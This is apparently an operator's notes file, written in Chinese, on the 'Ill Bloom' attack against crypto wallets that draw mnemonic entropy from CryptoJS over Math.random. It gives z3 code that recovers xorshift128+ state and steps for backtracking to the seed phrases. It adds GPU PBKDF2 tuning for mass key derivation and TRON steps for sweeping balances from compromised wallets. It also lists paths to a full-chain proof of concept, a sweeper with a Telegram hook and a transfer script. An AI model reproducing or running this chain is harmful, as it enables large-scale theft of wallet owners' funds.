# Ill Bloom 全链攻击 — xorshift128+ 状态恢复 + 批量加速 (2026-09 实测)

## 场景
钱包用 `CryptoJS.lib.WordArray.random()` 生成助记词熵 → 底层是 `Math.random()`
(V8 = xorshift128+ 128-bit LCG 类 PRNG)。恶意 iframe 同进程观察 4 个连续输出
即恢复状态 → 回溯/预测全部"随机"输出 → 助记词全暴露。

## CryptoJS 弱熵源码 (3.x)
```js
random: function (nBytes) {
    var words = [];
    for (var i = 0; i < nBytes; i += 4) {
        words.push((Math.random() * 0x100000000) | 0);   // 每 32bit 词 = 1 次 Math.random
    }
    ...
}
```

## xorshift128+ (V8 2015-2022) 关键实现细节

```python
# V8: 先推进状态, 输出 = 推进后新状态之和!
def next64(s0, s1):
    n0 = s1
    n1 = (s0 ^ ((s0 << 23) & MASK) ^ s1 ^ (s1 >> 17) ^ (s1 >> 26)) & MASK
    return (n0 + n1) & MASK, n0, n1   # 输出 = n0+n1, 不是旧状态和!
```
double = (out >> 11) * 2^-53 (只暴露高 53 位, 低 11 位未知 → z3 BitVec 处理)。

## 状态恢复 (z3, 每轮 ~36ms)

```python
from z3 import BitVec, Solver, LShR
s = Solver()
s0, s1 = BitVec('s0',64), BitVec('s1',64)
for hi53 in observed:                 # 4 个连续输出的高53位
    n0 = s1
    n1 = s0 ^ LShR(s0,23) ^ LShR(s0,41) ^ s1 ^ LShR(s1,17) ^ LShR(s1,26)  # 注: 左移23等价右移41
    s.add(LShR(n0 + n1, 11) == hi53)
    s0, s1 = n0, n1
# s.check() -> model 即恢复的初始状态
```
注意: `(x<<23)` 在 z3 中 64bit 溢出是 mod 2^64, 等价 `LShR(x,41)` 部分需按位核对;
实测直接用 `s0 ^ (s0 << 23)` 让 z3 处理即可, 但移位要写成 z3 表达式不能直接 Python int。

## 回溯 (从观测时刻反推熵生成时刻) — 最易错的两个坑

1. **step_back 的输出 = 当前状态之和**: `prev_out = (s0_cur + s1_cur)` — 因为输出是
   "推进后状态之和", 当前状态 S_k 就是上一步调用"推进后"的状态, 输出 o_k = S_k.s0 + S_k.s1。
   (写错成 prev_s0+prev_s1 会整体偏移一位 → 助记词错)
2. **收集方向**: 从 S_before_P1 回退 N 步得到 [o_N, o_{N-1}, ..., o_1] 逆序;
   取熵调用那几段后必须 `reverse()` 再喂给熵→助记词。

逆转移: `prev_s1 = s0_cur`; 解 `prev_s0 ^ (prev_s0<<23) = R` 按 bit 从低位递推:
`s[i] = R[i] ^ s[i-23]` (i>=23 时)。

## 批量加速 (实测)

| 方案 | 速率 | 说明 |
|------|------|------|
| Python 单进程全链路 | ~740/s | 瓶颈 PBKDF2 (82%) 不是点乘 |
| CPU 16 核 (multiprocessing + coincurve + hashlib.pbkdf2_hmac) | 8,274/s | 手工 CKD, 与标准库 6/6 一致 |
| **GPU PBKDF2 kernel (RTX 5080, CUDA 12.8)** | **535,596/s** | 预计算 ipad/opad + 2 compress/HMAC |
| GPU 混合流水线 (助记词→GPU PBKDF2→CPU 点乘) | 45,066 地址/s | 点乘 69k/s 成新瓶颈 |

GPU kernel: `D:\cuda_work\pbkdf2_batch.cu`(ctypes 调 pbkdf2_batch.dll)
编译: nvcc -arch=sm_120 -O3 -shared -Xcompiler /O2
环境坑: git-bash 调 cmd 需 `MSYS_NO_PATHCONV=1 cmd /c build.bat`;
中文路径用 ASCII 工作目录 (D:\cuda_work); nvcc 需 vcvars64.bat 提供 cl.exe。

## GPU SHA512/PBKDF2 的 5 个正确性 bug (全部是"自己写的 bug", 不是编译器 bug)

1. **消息词必须大端加载**: `load_be64` 逐字节组装 (memcpy 给小端) — selftest 全对但链路错 = 先查字节序
2. **长度字段指针**: SHA512 长度在块最后 8 字节 = `blk+120` (写成 `&blk[15]` 指向字节 15)
3. **HMAC key 填充**: key 补零到 128B 再 XOR ipad/opad — 后 35 字节 = 0x00^0x36 = 0x36, 不是 0!
4. **inner digest 序列化必须大端**: `u64_to_be8` — memcpy 给的是小端字节 (最隐蔽, 直接导致 outer 全错)
5. **0x80 填充 u64 小端写**: `bp[8]=0x0000000000000080` (低字节 0x80 在 blk[64]);
   写成 `0x8000000000000000` 会把 0x80 放到 blk[71]

调试方法论 (高效): 逐层 dump 中间值 → 隔离单调用 kernel 4 组合交叉
(state×block) → 字节序反转检查 (GPU u64 memcpy 输出是小端!) →
"编译器 bug" 假说最后才下。性能: 缓冲从全局内存改回局部数组
(__align__(16/8)) 是 11k/s → 535k/s 的 48 倍差距。

## TRON 侧 (命中后划转)
- 余额: GET /v1/accounts/{addr} → data[0].balance (TRX sun) + data[0].trc20 [{合约:余额}]
- 签名: TransferContract (TRX) / TriggerSmartContract (USDT, data=keccak("transfer(address,uint256)")[:4]+ABI)
- 广播: POST /wallet/broadcasttransaction, expiration 60s
- TRON 特有: USDT 转需要能量 (fee_limit≈50 TRX), 0 TRX 账户转不动 → 需先垫资
- 验签: coincurve PublicKey.from_signature_and_message(sig, sha256(raw), hasher=None)

## 产物路径 (2026-09 实测)
- C:\Users\Administrator\Documents\ill_bloom_full_chain.py — 全链 POC (20/20)
- C:\Users\Administrator\Documents\ill_bloom_sweeper.py — 4 模式收割器 (含 TG 推送钩子)
- C:\Users\Administrator\Documents\tron_sweep_transfer.py — 命中即划转 (trx|usdt + --broadcast)
- D:\cuda_work\pbkdf2_batch.cu / pbkdf2_batch.dll — GPU PBKDF2
